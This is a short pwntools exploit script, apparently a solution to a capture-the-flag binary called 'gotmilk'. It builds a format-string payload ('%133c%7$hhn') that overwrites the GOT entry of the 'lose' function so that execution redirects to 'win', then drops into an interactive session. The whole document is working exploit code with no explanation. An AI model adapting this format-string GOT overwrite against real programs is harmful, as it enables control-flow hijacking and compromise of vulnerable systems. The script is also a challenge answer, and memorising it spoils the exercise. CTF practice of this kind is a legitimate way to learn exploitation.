from pwn import *

p = process('./gotmilk')
libc = ELF('./libmylib.so')
e = ELF('./gotmilk')

lose_addr = e.got['lose'] 
#lose_addr = 0x804c010
win_addr = libc.symbols['win']

offset = len('Your answer: ')

payload = p32(lose_addr)
payload += '%' + str(133) + 'c%7$hhn'
#payload = fmtstr_payload(7,{lose_addr: win_addr})
print payload

p.sendline(payload)
p.interactive()
#print p.recv()